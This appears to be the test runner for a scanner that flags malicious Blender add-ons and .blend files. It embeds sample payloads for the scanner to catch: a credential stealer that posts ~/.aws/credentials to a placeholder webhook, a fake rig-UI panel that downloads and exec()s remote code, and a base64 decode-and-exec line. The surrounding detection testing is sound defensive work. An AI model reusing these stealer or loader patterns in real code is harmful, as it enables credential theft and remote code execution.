#!/usr/bin/env python3
"""Canary + control tests.

Every mal-* fixture must reach its expected level AND fire its expected pattern; every ok-*
fixture (things popular add-ons really do) must scan SAFE; med-* must be exactly MEDIUM and
low-* exactly LOW. Two .blend files are generated in a temp dir at test time (no binaries in the
repo). Fixtures are inert: hosts are reserved (.invalid / TEST-NET / zero ids), there are no real
credentials, and nothing here is ever imported, enabled or executed.

    python tests/run.py
"""
import os
import struct
import sys
import tempfile
import time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))
import blender_audit as ba  # noqa: E402

EXPECT = {
    "mal-stealer-register": ("CRITICAL", "credential_exfil"),
    "mal-env-exfil": ("CRITICAL", "env_exfil"),
    "mal-decode-exec": ("CRITICAL", "decode_exec"),
    "mal-download-exec": ("CRITICAL", "download_execute"),
    "mal-download-exec-var": ("CRITICAL", "download_execute"),
    "mal-powershell-cradle": ("CRITICAL", "download_execute"),
    "mal-reverse-shell": ("CRITICAL", "reverse_shell"),
    "mal-shell-persistence": ("CRITICAL", "persistence_write"),
    "mal-startup-persist": ("HIGH", "startup_persist"),
    "mal-auto-exec-enable": ("HIGH", "auto_exec_enable"),
    "mal-handler-blendtext": ("HIGH", "blend_autorun"),
    "mal-pip-git-register": ("HIGH", "pip_install"),
    "mal-exfil-host": ("HIGH", "exfil_host"),
    "mal-obfuscated": ("HIGH", "obfuscation"),
    "mal-shadow-wheel": ("HIGH", "shadow_wheel"),
    "mal-typosquat": ("MEDIUM", "typosquat"),
    "mal-submodule-stealer": ("CRITICAL", "credential_exfil"),
    "mal-cmd-var-curl": ("CRITICAL", "download_execute"),
    "mal-loop-cradle": ("CRITICAL", "download_execute"),
}

STEALER = """import bpy, os, json, urllib.request
def grab():
    p = os.path.expanduser("~/.aws/credentials")
    data = open(p).read() if os.path.exists(p) else ""
    req = urllib.request.Request("https://webhook.site/00000000-0000-0000-0000-000000000000", data=data.encode(), method="POST")
    urllib.request.urlopen(req)
def register():
    grab()
register()
"""
# the shape Morphisec reported (Nov 2025): a rig-UI text that, once Auto Run is on, fetches and
# runs a loader from a Cloudflare Workers URL. Reserved/inert host.
LOADER_RIG_UI = """import bpy
import urllib.request
class RigUI(bpy.types.Panel):
    bl_space_type = 'VIEW_3D'
    bl_region_type = 'UI'
    bl_label = "Rig Main Properties"
    def draw(self, context):
        self.layout.label(text="rig")
def register():
    bpy.utils.register_class(RigUI)
    u = "https://canary-loader.example.invalid/get-link"
    data = urllib.request.urlopen(u).read().decode()
    exec(data)
register()
"""
RIG_UI = """import bpy
class RigUI(bpy.types.Panel):
    bl_space_type = 'VIEW_3D'
    bl_region_type = 'UI'
    bl_label = "Rig Main Properties"
    def draw(self, context):
        self.layout.prop(context.active_object, '["ik_fk"]')
def register():
    bpy.utils.register_class(RigUI)
register()
"""


def fake_blend(script, name):
    """A minimal .blend-shaped byte stream: header, a TX block naming the text, then for each line a
    binary TextLine struct block followed by the line's characters - the layout Blender writes
    for Text datablocks."""
    out = bytearray(b"BLENDER-v402")
    tx = b"TX" + name.encode() + b"\x00"
    out += struct.pack("<4sIQII", b"TX\x00\x00", len(tx), 0x1000, 7, 1) + tx
    for i, line in enumerate(script.split("\n")):
        # TextLine struct (next, prev, line, format pointers + len/blen ints) ...
        tl = struct.pack("<QQQQii", 0x3000 + i * 64, 0x2f00 + i * 64, 0x2000 + i * 64, 0, len(line), len(line) + 1)
        out += struct.pack("<4sIQII", b"DATA", len(tl), 0x3000 + i * 64, 42, 1) + tl
        # ... then the line's characters as their own block
        b = line.encode() + b"\x00"
        b += b"\x00" * (-len(b) % 4)
        out += struct.pack("<4sIQII", b"DATA", len(b), 0x2000 + i * 64, 0, 1) + b
    out += struct.pack("<4sIQII", b"ENDB", 0, 0, 0, 0)
    return bytes(out)


def check(label, r, want, fid=None, exact=False):
    ids = sorted({f["id"] for f in r["findings"]})
    if exact:
        ok = r["risk_level"] == want and (fid is None or fid in ids)
    else:
        ok = ba.SEV_ORDER[r["risk_level"]] >= ba.SEV_ORDER[want] and (fid is None or fid in ids)
    print("%s %-30s %-8s %s" % ("PASS" if ok else "FAIL", label, r["risk_level"], ",".join(ids)))
    return 0 if ok else 1


def main():
    fails = 0
    root = os.path.join(HERE, "fixtures")
    for name in sorted(os.listdir(root)):
        files, blends = ba.read_path(os.path.join(root, name))
        r = ba.scan_package(files, name, blends)
        if name.startswith("mal-"):
            want, fid = EXPECT[name]
            fails += check(name, r, want, fid)
        elif name.startswith("med-"):
            fails += check(name, r, "MEDIUM", exact=True)
        elif name.startswith("low-"):
            fails += check(name, r, "LOW", "undeclared_network", exact=True)
        elif name.startswith("unl-"):
            # risky code in a file the add-on never imports: reported, but at most LOW
            ok = ba.SEV_ORDER[r["risk_level"]] <= ba.SEV_ORDER["LOW"]
            print("%s %-30s %-8s %s" % ("PASS" if ok else "FAIL", name, r["risk_level"], "(not imported)"))
            fails += not ok
        else:
            fails += check(name, r, "SAFE", exact=True)
    for m in sorted(set(EXPECT) - set(os.listdir(root))):
        print("FAIL missing fixture", m)
        fails += 1

    with tempfile.TemporaryDirectory() as td:
        bad = os.path.join(td, "scene_bad.blend")
        good = os.path.join(td, "rig.blend")
        open(bad, "wb").write(fake_blend(STEALER, "setup.py"))
        open(good, "wb").write(fake_blend(RIG_UI, "rig_ui.py"))
        files, blends = ba.read_path(bad)
        r = ba.scan_package(files, "blend-stealer", blends)
        fails += check("blend-stealer (default)", r, "MEDIUM", "blend_payload", exact=True)
        r = ba.scan_package(files, "blend-stealer", blends, strict_blend=True)
        fails += check("blend-stealer (--strict-blend)", r, "CRITICAL", "credential_exfil")
        loader = os.path.join(td, "character.blend")
        open(loader, "wb").write(fake_blend(LOADER_RIG_UI, "Rig_Ui.py"))
        files, blends = ba.read_path(loader)
        r = ba.scan_package(files, "blend-loader-rig-ui", blends)
        fails += check("blend-loader-rig-ui (default)", r, "MEDIUM", "blend_payload", exact=True)
        r = ba.scan_package(files, "blend-loader-rig-ui", blends, strict_blend=True)
        fails += check("blend-loader-rig-ui (--strict)", r, "CRITICAL", "download_execute")
        files, blends = ba.read_path(good)
        r = ba.scan_package(files, "blend-rig-ui", blends)
        ok = r["risk_level"] == "SAFE" and any(i["id"] == "blend_script" for i in r["info"])
        print("%s %-30s %-8s %s" % ("PASS" if ok else "FAIL", "blend-rig-ui", r["risk_level"], "blend_script seen" if ok else ""))
        fails += not ok

    # --text and a plain string
    r = ba.scan('import os\nexec(__import__("base64").b64decode("cHJpbnQoMSk="))', "<t>")
    fails += check("--text decode-exec", r, "CRITICAL", "decode_exec")
    r = ba.scan("import bpy\nprint(bpy.app.version_string)\n", "<t>")
    fails += check("--text benign", r, "SAFE", exact=True)

    # performance: a module at the 2 MB per-file cap must scan in a few seconds
    big = "import bpy\n" + "".join("def f%d(x):\n    return x * %d + len(str(x))\n" % (i, i) for i in range(40000))
    t0 = time.time()
    ba.scan(big, "<big>")
    dt = time.time() - t0
    ok = dt < 25   # generous: CI boxes and loaded machines; ~3-6 s idle
    print("%s %-30s %.1fs for %.1f MB" % ("PASS" if ok else "FAIL", "perf 2 MB module", dt, len(big) / 1e6))
    fails += not ok

    print("\n%d failure(s)" % fails)
    return 1 if fails else 0


if __name__ == "__main__":
    sys.exit(main())
